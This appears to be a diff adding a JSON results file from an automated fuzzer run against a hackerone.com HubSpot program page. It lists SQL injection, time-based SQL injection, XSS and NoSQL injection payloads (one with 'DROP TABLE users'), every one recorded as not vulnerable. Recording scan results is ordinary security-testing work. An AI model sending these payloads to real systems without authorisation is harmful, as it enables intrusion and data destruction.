@@ -1,0 +1,55 @@
+{
+  "SQL Injection Fuzzer": {
+    "https://hackerone.com/hubspot?type=team?test=' OR '1'='1": {
+      "status": 200,
+      "vulnerable": false
+    },
+    "https://hackerone.com/hubspot?type=team?test=' OR 1=1--": {
+      "status": 200,
+      "vulnerable": false
+    },
+    "https://hackerone.com/hubspot?type=team?test='; DROP TABLE users; --": {
+      "status": 200,
+      "vulnerable": false
+    },
+    "https://hackerone.com/hubspot?type=team?test=' OR '1'='1' /*": {
+      "status": 200,
+      "vulnerable": false
+    },
+    "https://hackerone.com/hubspot?type=team?test=' UNION SELECT NULL, NULL, NULL--": {
+      "status": 200,
+      "vulnerable": false
+    }
+  },
+  "XSS Fuzzer": {
+    "https://hackerone.com/hubspot?type=team?xss=<script>alert('XSS')</script>": {
+      "status": 200,
+      "reflected": false
+    },
+    "https://hackerone.com/hubspot?type=team?xss='\"><script>alert('XSS')</script>": {
+      "status": 200,
+      "reflected": false
+    },
+    "https://hackerone.com/hubspot?type=team?xss=<img src=x onerror=alert('XSS')>": {
+      "status": 200,
+      "reflected": false
+    },
+    "https://hackerone.com/hubspot?type=team?xss=<svg/onload=alert('XSS')>": {
+      "status": 200,
+      "reflected": false
+    },
+    "https://hackerone.com/hubspot?type=team?xss=<body onload=alert('XSS')>": {
+      "status": 200,
+      "reflected": false
+    }
+  },
+  "Time-Based SQL Injection Fuzzer": {
+    "https://hackerone.com/hubspot?type=team ('; WAITFOR DELAY '00:00:05'--)": "0.6349 sec",
+    "https://hackerone.com/hubspot?type=team (1' OR IF(1=1, sleep(5), null) --)": "0.6528 sec"
+  },
+  "NoSQL Injection Fuzzer": {
+    "https://hackerone.com/hubspot?type=team ({\"$ne\": \"\"})": "SAFE",
+    "https://hackerone.com/hubspot?type=team ({\"$gt\": \"\"})": "SAFE",
+    "https://hackerone.com/hubspot?type=team ({\"$regex\": \".*\"})": "SAFE"
+  }
+}
